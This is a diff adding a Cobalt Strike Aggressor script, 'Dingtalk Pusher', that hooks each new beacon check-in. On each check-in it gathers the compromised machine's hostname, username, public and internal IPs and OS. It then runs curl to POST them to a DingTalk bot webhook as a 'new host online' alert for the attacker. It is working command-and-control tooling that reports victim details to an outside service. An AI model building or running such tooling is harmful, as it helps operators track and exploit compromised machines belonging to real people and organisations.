@@ -1,0 +1,23 @@
+# Dingtalk Pusher
+# Author: @sari3l
+#
+
+$dingtalk_bot_token = 'xxxxxxxx';
+$dingtalk_message_from = 'CS-Server';
+
+
+on beacon_initial {
+	# local($hostName $userName $externalIP $internalIP $os $content $date $time);
+	$listener = beacon_info($1, 'listener');
+	$hostName = beacon_info($1, 'computer');
+	$userName = beacon_info($1, 'user');
+	$externalIP = beacon_info($1, 'external');
+	$internalIP = beacon_info($1, 'internal');
+	$os = beacon_info($1, 'os') . ' ' .beacon_info($1, 'ver') . ' ' . beacon_info($1, 'barch');
+	($date, $time) = split(" ", tstamp(ticks()));
+	$date = replace($date, "/", '月').'日';
+	$time = replace($time, ':', '时').'分';
+	@command = @('curl', '-X', 'POST', 'https://oapi.dingtalk.com/robot/send?access_token='.$dingtalk_bot_token, '-H', 'Content-Type: application/json', '-d', '{"msgtype": "markdown", "markdown":{"title":"新主机上线提醒","text": "# 新主机上线提醒 \n> #### 服务器: '.$dingtalk_message_from.'\n> #### 监听器: '.$listener.'\n --- \n> #### 主机名: '.$hostName.'\n> #### 用户名: '.$userName.'\n> #### 公网IP: '.$externalIP.'\n> #### 内网IP: '.$internalIP.'\n> #### 系统: '.$os.'\n --- \n> ###### '.$date.' '.$time.'发布\n"}, "at": {"isAtAll": false}}');
+	
+	exec(@command);
+}
